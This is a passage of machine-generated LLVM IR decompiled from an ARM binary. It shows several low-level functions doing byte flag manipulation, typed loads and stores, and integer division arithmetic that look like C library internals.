dec_label_pc_1134c:                               ; preds = %dec_label_pc_11338.dec_label_pc_1134c_crit_edge, %dec_label_pc_11230, %dec_label_pc_1132c
  %v2_11358 = phi i32 [ %v2_11358.pre, %dec_label_pc_11338.dec_label_pc_1134c_crit_edge ], [ %v3_11230, %dec_label_pc_11230 ], [ %v3_11230, %dec_label_pc_1132c ]
  %v0_11350 = phi i32 [ %v0_11350.pre, %dec_label_pc_11338.dec_label_pc_1134c_crit_edge ], [ %arg1, %dec_label_pc_11230 ], [ %arg1, %dec_label_pc_1132c ]
  %v0_1134c = phi i32 [ %v0_1134c.pre, %dec_label_pc_11338.dec_label_pc_1134c_crit_edge ], [ %arg3, %dec_label_pc_11230 ], [ %arg3, %dec_label_pc_1132c ]
  %v0_11354 = phi i32 [ %v0_11354.pre, %dec_label_pc_11338.dec_label_pc_1134c_crit_edge ], [ %arg2, %dec_label_pc_11230 ], [ %arg2, %dec_label_pc_1132c ]
  store i32 %v2_11358, i32* @r4, align 4
  store i32 %v9_11230, i32* @r6, align 4
  store i32 %v15_11230, i32* @lr, align 4
  %v3_1135c = inttoptr i32 %v0_1134c to i8*
  %v4_1135c = call i32 @function_11174(i8* %v3_1135c, i32 %v0_11350, i32 %v0_11354)
  br label %dec_label_pc_11360

dec_label_pc_11360:                               ; preds = %bb13, %dec_label_pc_112e4, %dec_label_pc_112d4, %dec_label_pc_112bc, %dec_label_pc_11298, %dec_label_pc_11310, %bb10, %dec_label_pc_1134c
  %v0_11360 = load i32, i32* @r6, align 4
  %v2_11364 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11364, i32* @r4, align 4
  store i32 %v6_11230, i32* @r5, align 4
  store i32 %v9_11230, i32* @r6, align 4
  store i32 %v12_11230, i32* @r7, align 4
  ret i32 %v0_11360

; uselistorder directives
  uselistorder i32 %v2_11318, { 1, 0 }
  uselistorder i32 %v2_112f0, { 1, 0 }
  uselistorder i32 %v0_112d8.v0_112e4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_112e4, { 1, 0, 2 }
  uselistorder i32 %v2_11264, { 2, 0, 1, 3 }
  uselistorder i32 %v9_11230, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %arg3, { 0, 1, 7, 2, 4, 3, 5, 6, 8 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_11360, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_1134c, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_11368(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11368:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11368 = load i32, i32* @r4, align 4
  store i32 %v3_11368, i32* %stack_var_-8, align 4
  %v3_1136c = load i8, i8* %arg1, align 1
  %v4_1136c = zext i8 %v3_1136c to i32
  store i32 %v4_1136c, i32* %r2.global-to-local, align 4
  %v2_11370 = add i32 %tmp, 1
  %v3_11370 = inttoptr i32 %v2_11370 to i8*
  %v4_11370 = load i8, i8* %v3_11370, align 1
  %v5_11370 = zext i8 %v4_11370 to i32
  store i32 %v5_11370, i32* %r3.global-to-local, align 4
  %v4_11374 = mul nuw nsw i32 %v5_11370, 256
  %v5_11374 = or i32 %v4_11374, %v4_1136c
  store i32 %v5_11374, i32* %r2.global-to-local, align 4
  %v2_11378 = and i32 %v5_11374, %arg2
  %v4_11378 = icmp eq i32 %v2_11378, 0
  store i1 %v4_11378, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_11378, label %dec_label_pc_11384, label %dec_label_pc_1139c

dec_label_pc_11384:                               ; preds = %dec_label_pc_11368
  %v1_11384 = and i32 %v5_11374, 2176
  %v2_11384 = icmp eq i32 %v1_11384, 0
  store i1 %v2_11384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11384, label %dec_label_pc_1138c, label %dec_label_pc_113b0

dec_label_pc_1138c:                               ; preds = %dec_label_pc_11384
  %v2_1138c = or i32 %v5_11374, %arg2
  store i32 %v2_1138c, i32* %r2.global-to-local, align 4
  %v3_11390 = sdiv i32 %v2_1138c, 256
  store i32 %v3_11390, i32* %r3.global-to-local, align 4
  %v1_11394 = trunc i32 %v3_11390 to i8
  store i8 %v1_11394, i8* %v3_11370, align 1
  %v0_11398 = load i32, i32* %r2.global-to-local, align 4
  %v1_11398 = trunc i32 %v0_11398 to i8
  store i8 %v1_11398, i8* %arg1, align 1
  %v0_1139c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1139c

dec_label_pc_1139c:                               ; preds = %dec_label_pc_11368, %dec_label_pc_1138c
  %v0_113e8 = phi i32 [ %tmp, %dec_label_pc_11368 ], [ %v0_1139c.pre, %dec_label_pc_1138c ]
  %v1_1139c = inttoptr i32 %v0_113e8 to i8*
  %v2_1139c = load i8, i8* %v1_1139c, align 1
  %v3_1139c = zext i8 %v2_1139c to i32
  store i32 %v3_1139c, i32* %r2.global-to-local, align 4
  %v1_113a0 = add i32 %v0_113e8, 1
  %v2_113a0 = inttoptr i32 %v1_113a0 to i8*
  %v3_113a0 = load i8, i8* %v2_113a0, align 1
  %v4_113a0 = zext i8 %v3_113a0 to i32
  store i32 %v4_113a0, i32* %r3.global-to-local, align 4
  %v4_113a4 = mul nuw nsw i32 %v4_113a0, 256
  %v5_113a4 = or i32 %v4_113a4, %v3_1139c
  store i32 %v5_113a4, i32* @ip, align 4
  %v1_113a8 = and i32 %v3_1139c, 32
  %v2_113a8 = icmp eq i32 %v1_113a8, 0
  store i1 %v2_113a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113a8, label %dec_label_pc_113d8, label %dec_label_pc_113b0

dec_label_pc_113b0:                               ; preds = %dec_label_pc_11384, %dec_label_pc_1139c
  %v0_113b0 = call i32 @function_cc08()
  store i32 %v0_113b0, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_113b8 = inttoptr i32 %v0_113b0 to i32*
  store i32 9, i32* %v2_113b8, align 4
  br label %dec_label_pc_113bc

dec_label_pc_113bc:                               ; preds = %dec_label_pc_11400, %dec_label_pc_113b0
  %v0_113bc = load i32, i32* @r4, align 4
  %v1_113bc = inttoptr i32 %v0_113bc to i32*
  %v2_113bc = load i32, i32* %v1_113bc, align 4
  %v1_113c0 = or i32 %v2_113bc, 8
  store i32 %v1_113c0, i32* %r3.global-to-local, align 4
  %v3_113c4 = sdiv i32 %v2_113bc, 256
  store i32 %v3_113c4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_113cc = trunc i32 %v3_113c4 to i8
  %v3_113cc = add i32 %v0_113bc, 1
  %v4_113cc = inttoptr i32 %v3_113cc to i8*
  store i8 %v1_113cc, i8* %v4_113cc, align 1
  %v0_113d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_113d0 = trunc i32 %v0_113d0 to i8
  %v2_113d0 = load i32, i32* @r4, align 4
  %v3_113d0 = inttoptr i32 %v2_113d0 to i8*
  store i8 %v1_113d0, i8* %v3_113d0, align 1
  %v2_113d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_113d4, i32* @r4, align 4
  ret i32 -1

dec_label_pc_113d8:                               ; preds = %dec_label_pc_1139c
  %tmp15 = urem i8 %v2_1139c, 4
  %v2_113d8 = icmp eq i8 %tmp15, 0
  store i1 %v2_113d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113d8, label %dec_label_pc_1143c, label %dec_label_pc_113e0

dec_label_pc_113e0:                               ; preds = %dec_label_pc_113d8
  %v1_113e0 = and i32 %v3_1139c, 4
  store i32 %v1_113e0, i32* @r1, align 4
  %v2_113e0 = icmp eq i32 %v1_113e0, 0
  store i1 %v2_113e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113e0, label %dec_label_pc_113e8, label %dec_label_pc_11418

dec_label_pc_113e8:                               ; preds = %dec_label_pc_113e0
  %v1_113e8 = add i32 %v0_113e8, 20
  %v2_113e8 = inttoptr i32 %v1_113e8 to i32*
  %v3_113e8 = load i32, i32* %v2_113e8, align 4
  store i32 %v3_113e8, i32* %r2.global-to-local, align 4
  %v1_113ec = add i32 %v0_113e8, 16
  %v2_113ec = inttoptr i32 %v1_113ec to i32*
  %v3_113ec = load i32, i32* %v2_113ec, align 4
  store i32 %v3_113ec, i32* %r3.global-to-local, align 4
  %v9_113f0 = icmp eq i32 %v3_113e8, %v3_113ec
  store i1 %v9_113f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_113f0, label %dec_label_pc_113f8, label %dec_label_pc_11400

dec_label_pc_113f8:                               ; preds = %dec_label_pc_113e8
  %v1_113f8 = and i32 %v3_1139c, 2
  %v2_113f8 = icmp eq i32 %v1_113f8, 0
  store i1 %v2_113f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113f8, label %dec_label_pc_11418, label %dec_label_pc_11400

dec_label_pc_11400:                               ; preds = %dec_label_pc_113e8, %dec_label_pc_113f8
  %v1_11400 = and i32 %v4_113a4, 1024
  %v2_11400 = icmp eq i32 %v1_11400, 0
  store i1 %v2_11400, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_11400, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_1140c = call i32 @function_132c0()
  store i32 %v0_1140c, i32* %r0.global-to-local, align 4
  %v2_11410 = icmp eq i32 %v0_1140c, 0
  store i1 %v2_11410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11410, label %.dec_label_pc_11418_crit_edge, label %dec_label_pc_113bc

.dec_label_pc_11418_crit_edge:                    ; preds = %dec_label_pc_11400
  %v0_11418.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11418

dec_label_pc_11418:                               ; preds = %.dec_label_pc_11418_crit_edge, %dec_label_pc_113e0, %dec_label_pc_113f8
  %v2_11428 = phi i32 [ %v0_11418.pre, %.dec_label_pc_11418_crit_edge ], [ %v0_113e8, %dec_label_pc_113e0 ], [ %v0_113e8, %dec_label_pc_113f8 ]
  %v1_11418 = inttoptr i32 %v2_11428 to i32*
  %v2_11418 = load i32, i32* %v1_11418, align 4
  store i32 %v2_11418, i32* %r3.global-to-local, align 4
  %v1_1141c = add i32 %v2_11428, 8
  %v2_1141c = inttoptr i32 %v1_1141c to i32*
  %v3_1141c = load i32, i32* %v2_1141c, align 4
  store i32 %v3_1141c, i32* %r1.global-to-local, align 4
  %v1_11420 = and i32 %v2_11418, -4
  store i32 %v1_11420, i32* %r3.global-to-local, align 4
  %v3_11424 = sdiv i32 %v2_11418, 256
  store i32 %v3_11424, i32* %r2.global-to-local, align 4
  %v1_11428 = trunc i32 %v3_11424 to i8
  %v3_11428 = add i32 %v2_11428, 1
  %v4_11428 = inttoptr i32 %v3_11428 to i8*
  store i8 %v1_11428, i8* %v4_11428, align 1
  %v0_1142c = load i32, i32* %r1.global-to-local, align 4
  %v1_1142c = load i32, i32* @r4, align 4
  %v2_1142c = add i32 %v1_1142c, 20
  %v3_1142c = inttoptr i32 %v2_1142c to i32*
  store i32 %v0_1142c, i32* %v3_1142c, align 4
  %v0_11430 = load i32, i32* %r3.global-to-local, align 4
  %v1_11430 = trunc i32 %v0_11430 to i8
  %v2_11430 = load i32, i32* @r4, align 4
  %v3_11430 = inttoptr i32 %v2_11430 to i8*
  store i8 %v1_11430, i8* %v3_11430, align 1
  %v0_11434 = load i32, i32* %r1.global-to-local, align 4
  %v1_11434 = load i32, i32* @r4, align 4
  %v2_11434 = add i32 %v1_11434, 24
  %v3_11434 = inttoptr i32 %v2_11434 to i32*
  store i32 %v0_11434, i32* %v3_11434, align 4
  %v0_11438 = load i32, i32* %r1.global-to-local, align 4
  %v1_11438 = load i32, i32* @r4, align 4
  %v2_11438 = add i32 %v1_11438, 16
  %v3_11438 = inttoptr i32 %v2_11438 to i32*
  store i32 %v0_11438, i32* %v3_11438, align 4
  %v0_1143c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1143c

dec_label_pc_1143c:                               ; preds = %dec_label_pc_113d8, %dec_label_pc_11418
  %v2_11448 = phi i32 [ %v0_113e8, %dec_label_pc_113d8 ], [ %v0_1143c.pre, %dec_label_pc_11418 ]
  %v1_1143c = inttoptr i32 %v2_11448 to i32*
  %v2_1143c = load i32, i32* %v1_1143c, align 4
  %v1_11440 = or i32 %v2_1143c, 64
  store i32 %v1_11440, i32* %r2.global-to-local, align 4
  %v3_11444 = sdiv i32 %v2_1143c, 256
  store i32 %v3_11444, i32* %r3.global-to-local, align 4
  %v1_11448 = trunc i32 %v3_11444 to i8
  %v3_11448 = add i32 %v2_11448, 1
  %v4_11448 = inttoptr i32 %v3_11448 to i8*
  store i8 %v1_11448, i8* %v4_11448, align 1
  %v0_1144c = load i32, i32* @r4, align 4
  %v1_1144c = add i32 %v0_1144c, 1
  %v2_1144c = inttoptr i32 %v1_1144c to i8*
  %v3_1144c = load i8, i8* %v2_1144c, align 1
  %v4_1144c = zext i8 %v3_1144c to i32
  %v3_11450 = mul nuw nsw i32 %v4_1144c, 256
  store i32 %v3_11450, i32* %r3.global-to-local, align 4
  %v1_11454 = and i32 %v3_11450, 2816
  store i32 %v1_11454, i32* %r0.global-to-local, align 4
  %v2_11454 = icmp eq i32 %v1_11454, 0
  store i1 %v2_11454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11454, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_1143c
  %v2_11458 = add i32 %v0_1144c, 12
  %v3_11458 = inttoptr i32 %v2_11458 to i32*
  %v4_11458 = load i32, i32* %v3_11458, align 4
  store i32 %v4_11458, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_1143c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_11460 = load i32, i32* %r2.global-to-local, align 4
  %v1_11460 = trunc i32 %v0_11460 to i8
  %v3_11460 = inttoptr i32 %v0_1144c to i8*
  store i8 %v1_11460, i8* %v3_11460, align 1
  %v0_11464 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11464, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_11464 = load i32, i32* %r3.global-to-local, align 4
  %v2_11464 = load i32, i32* @r4, align 4
  %v3_11464 = add i32 %v2_11464, 28
  %v4_11464 = inttoptr i32 %v3_11464 to i32*
  store i32 %v1_11464, i32* %v4_11464, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_11468 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11468, i32* @r4, align 4
  %v8_11468 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_11468

; uselistorder directives
  uselistorder i32 %v3_11450, { 1, 0 }
  uselistorder i32 %v3_11444, { 1, 0 }
  uselistorder i32 %v3_11424, { 1, 0 }
  uselistorder i32 %v2_11428, { 0, 2, 1 }
  uselistorder i1 %v2_113d8, { 1, 0 }
  uselistorder i32 %v3_113c4, { 1, 0 }
  uselistorder i32 %v3_1139c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_113e8, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_11390, { 1, 0 }
  uselistorder i32 %v5_11374, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32 1024, { 0, 7, 8, 2, 9, 1, 10, 11, 12, 3, 5, 6, 4 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_1143c, { 1, 0 }
  uselistorder label %dec_label_pc_11418, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11400, { 1, 0 }
  uselistorder label %dec_label_pc_113b0, { 1, 0 }
  uselistorder label %dec_label_pc_1139c, { 1, 0 }
}

define i32 @function_1146c() local_unnamed_addr {
dec_label_pc_1146c:
  %v0_1146c = load i32, i32* @r2, align 4
  %v1_1146c = icmp slt i32 %v0_1146c, 0
  %v0_11470 = load i32, i32* @r0, align 4
  %v1_11474 = and i32 %v0_11470, 2048
  %v2_114a8 = icmp eq i32 %v1_11474, 0
  br i1 %v1_1146c, label %dec_label_pc_114a8, label %dec_label_pc_1147c

dec_label_pc_1147c:                               ; preds = %dec_label_pc_1146c
  br i1 %v2_114a8, label %dec_label_pc_11484, label %dec_label_pc_114b0

dec_label_pc_11484:                               ; preds = %dec_label_pc_1147c
  %v7_11484 = icmp eq i32 %v0_11470, 256
  %v0_11488 = load i32, i32* @r1, align 4
  %v1_11488 = inttoptr i32 %v0_11488 to i32*
  %v2_11488 = load i32, i32* %v1_11488, align 4
  %v2_1148c = urem i32 %v2_11488, 256
  %v2_1148c.v2_11488 = select i1 %v7_11484, i32 %v2_1148c, i32 %v2_11488
  br i1 %v7_11484, label %.thread, label %dec_label_pc_11494

dec_label_pc_11494:                               ; preds = %dec_label_pc_11484
  %v7_11494 = icmp eq i32 %v0_11470, 512
  br i1 %v7_11494, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11494
  %v4_1149c = urem i32 %v2_1148c.v2_11488, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11494, %dec_label_pc_11484, %bb
  %v1_114a4 = phi i32 [ %v2_11488, %dec_label_pc_11494 ], [ %v2_1148c, %dec_label_pc_11484 ], [ %v4_1149c, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_114a4

dec_label_pc_114a8:                               ; preds = %dec_label_pc_1146c
  br i1 %v2_114a8, label %dec_label_pc_114b8, label %dec_label_pc_114b0

dec_label_pc_114b0:                               ; preds = %dec_label_pc_1147c, %dec_label_pc_114a8
  %v0_114b0 = load i32, i32* @r1, align 4
  %v1_114b0 = inttoptr i32 %v0_114b0 to i32*
  %v2_114b0 = load i32, i32* %v1_114b0, align 4
  %v3_114b0 = add i32 %v0_114b0, 4
  %v4_114b0 = inttoptr i32 %v3_114b0 to i32*
  %v5_114b0 = load i32, i32* %v4_114b0, align 4
  store i32 %v5_114b0, i32* @r1, align 4
  ret i32 %v2_114b0

dec_label_pc_114b8:                               ; preds = %dec_label_pc_114a8
  %v7_114b8 = icmp eq i32 %v0_11470, 256
  %v0_114bc = load i32, i32* @r1, align 4
  %v1_114bc = inttoptr i32 %v0_114bc to i32*
  %v2_114bc = load i32, i32* %v1_114bc, align 4
  %v2_114c0 = urem i32 %v2_114bc, 256
  %v2_114c0.v2_114bc = select i1 %v7_114b8, i32 %v2_114c0, i32 %v2_114bc
  br i1 %v7_114b8, label %.thread2, label %dec_label_pc_114c8

dec_label_pc_114c8:                               ; preds = %dec_label_pc_114b8
  %v7_114c8 = icmp eq i32 %v0_11470, 512
  br i1 %v7_114c8, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_114c8
  %v4_114cc = mul i32 %v2_114c0.v2_114bc, 65536
  %v4_114d0 = sdiv i32 %v4_114cc, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_114c8, %dec_label_pc_114b8, %bb5
  %v0_114d4 = phi i32 [ %v2_114bc, %dec_label_pc_114c8 ], [ %v2_114c0, %dec_label_pc_114b8 ], [ %v4_114d0, %bb5 ]
  %v3_114d4 = ashr i32 %v0_114d4, 31
  store i32 %v3_114d4, i32* @r1, align 4
  ret i32 %v0_114d4

; uselistorder directives
  uselistorder i32 %v0_114d4, { 1, 0 }
  uselistorder i32 %v2_114c0, { 1, 0 }
  uselistorder i32 %v2_114bc, { 1, 2, 0 }
  uselistorder i32 %v2_1148c, { 1, 0 }
  uselistorder i32 %v2_11488, { 1, 2, 0 }
  uselistorder i1 %v2_114a8, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_114b0, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @function_114dc(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_114dc:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_114dc = icmp eq i32 %arg2, 256
  br i1 %v7_114dc, label %dec_label_pc_11508, label %dec_label_pc_114e4

dec_label_pc_114e4:                               ; preds = %dec_label_pc_114dc
  %v7_114e4 = icmp eq i32 %arg2, 2048
  br i1 %v7_114e4, label %dec_label_pc_114ec, label %dec_label_pc_114f4

dec_label_pc_114ec:                               ; preds = %dec_label_pc_114e4
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_114ec = add i32 %tmp2, 4
  %v6_114ec = inttoptr i32 %v5_114ec to i32*
  store i32 %arg4, i32* %v6_114ec, align 4
  ret i32 %tmp2

dec_label_pc_114f4:                               ; preds = %dec_label_pc_114e4
  %v7_114f4 = icmp eq i32 %arg2, 512
  %v4_114f8 = sdiv i32 %arg3, 256
  store i32 %v4_114f8, i32* @ip, align 4
  br i1 %v7_114f4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_114f4
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_114f4
  %v1_11504 = trunc i32 %v4_114f8 to i8
  %v4_11504 = add i32 %tmp2, 1
  %v5_11504 = inttoptr i32 %v4_11504 to i8*
  store i8 %v1_11504, i8* %v5_11504, align 1
  br label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %dec_label_pc_114dc, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %v4_114f8, { 1, 0 }
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i8* %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_11508, { 1, 0 }
}

define i32 @function_11510(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11510:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_11514 = icmp slt i32 %arg4, 0
  %v2_11514 = icmp eq i32 %arg4, 0
  store i1 %v2_11514, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_11514, label %dec_label_pc_1152c, label %dec_label_pc_1154c

dec_label_pc_1152c:                               ; preds = %dec_label_pc_11510
  %v1_1152c = icmp slt i32 %arg3, 0
  %v2_1152c = icmp eq i32 %arg3, 0
  store i1 %v2_1152c, i1* %cpsr_z.global-to-local, align 1
  %v1_11530 = sub i32 0, %arg4
  store i32 %v1_11530, i32* %r7.global-to-local, align 4
  br i1 %v1_1152c, label %dec_label_pc_11538, label %dec_label_pc_1154c

dec_label_pc_11538:                               ; preds = %dec_label_pc_1152c
  %v1_1153c = sub i32 0, %arg2
  store i32 %v1_1153c, i32* %r5.global-to-local, align 4
  %v2_1153c = icmp eq i32 %arg2, 0
  %v2_11540 = icmp eq i1 %v2_1153c, false
  %v5_11540 = sext i1 %v2_11540 to i32
  %v6_11540 = sub i32 %v5_11540, %arg3
  store i32 %v6_11540, i32* %r6.global-to-local, align 4
  %v19_11540 = icmp eq i32 %v6_11540, 0
  store i1 %v19_11540, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11554

dec_label_pc_1154c:                               ; preds = %dec_label_pc_1152c, %dec_label_pc_11510
  br label %dec_label_pc_11554

dec_label_pc_11554:                               ; preds = %dec_label_pc_11538, %dec_label_pc_1154c
  %storemerge = phi i8 [ 0, %dec_label_pc_1154c ], [ 1, %dec_label_pc_11538 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_1155c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1155c, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v0_11564 = call i32 @function_148a4()
  store i32 %v0_11564, i32* %fp.global-to-local, align 4
  %v2_11574 = call i32 @function_c864(i32 -1, i32 %v0_1155c)
  %v1_11578 = add i32 %v2_11574, 1
  store i32 %v1_11578, i32* %sb.global-to-local, align 4
  %v1_1157c = load i32, i32* %r7.global-to-local, align 4
  %v9_1157c = icmp eq i32 %v1_11578, %v1_1157c
  store i1 %v9_1157c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1157c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11554
  %v1_11580 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_11580, i32* %sb.global-to-local, align 4
  %v1_11584 = load i32, i32* %fp.global-to-local, align 4
  %v2_11584 = add i32 %v1_11584, 1
  store i32 %v2_11584, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11554, %bb
  %v0_11588 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_11588, i32* %sl.global-to-local, align 4
  %v0_1158c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1158c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11590

dec_label_pc_11590thread-pre-split:               ; preds = %bb19
  %v0_11590.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_11598.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11590

dec_label_pc_11590:                               ; preds = %dec_label_pc_11590thread-pre-split, %.thread
  %v0_11600 = phi i32 [ %v0_11598.pre, %dec_label_pc_11590thread-pre-split ], [ %v1_1157c, %.thread ]
  %v0_11594 = phi i32 [ %v0_11590.pr, %dec_label_pc_11590thread-pre-split ], [ %v0_11588, %.thread ]
  %v2_11590 = icmp eq i32 %v0_11594, 0
  store i1 %v2_11590, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11590, label %dec_label_pc_115fc, label %dec_label_pc_115a0

dec_label_pc_115a0:                               ; preds = %dec_label_pc_11590
  %v2_115a0 = call i32 @function_c864(i32 %v0_11594, i32 %v0_11600)
  %v0_115a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_115a4, i32* @r1, align 4
  store i32 %v2_115a0, i32* %r4.global-to-local, align 4
  %v0_115ac = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_115ac, i32* @r0, align 4
  %v0_115b0 = call i32 @function_148a4()
  store i32 %v0_115b0, i32* %sl.global-to-local, align 4
  %v0_115bc = load i32, i32* %r6.global-to-local, align 4
  %v2_115c0 = call i32 @function_c864(i32 %v0_115bc, i32 %v0_115a4)
  %v0_115c4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_115c4, i32* @r1, align 4
  %v0_115c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_115c8 = load i32, i32* %sb.global-to-local, align 4
  %v3_115c8 = mul i32 %v1_115c8, %v0_115c8
  %v4_115c8 = add i32 %v3_115c8, %v2_115c0
  store i32 %v4_115c8, i32* %r5.global-to-local, align 4
  %v0_115cc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_115cc, i32* @r0, align 4
  %v0_115d0 = call i32 @function_148a4()
  %v0_115d4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_115d4, i32* @r1, align 4
  %v0_115d8 = load i32, i32* %fp.global-to-local, align 4
  %v1_115d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_115d8 = mul i32 %v1_115d8, %v0_115d8
  %v4_115d8 = add i32 %v3_115d8, %v0_115d0
  store i32 %v4_115d8, i32* %r4.global-to-local, align 4
  %v0_115dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_115dc, i32* @r0, align 4
  %v0_115e0 = call i32 @function_148a4()
  %v0_115e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_115e8 = add i32 %v4_115d8, %v0_115e0
  store i32 %v2_115e8, i32* %r6.global-to-local, align 4
  %v2_115f0 = call i32 @function_c864(i32 %v0_115dc, i32 %v0_115e4)
  store i32 %v2_115f0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1161c

dec_label_pc_115fc:                               ; preds = %dec_label_pc_11590
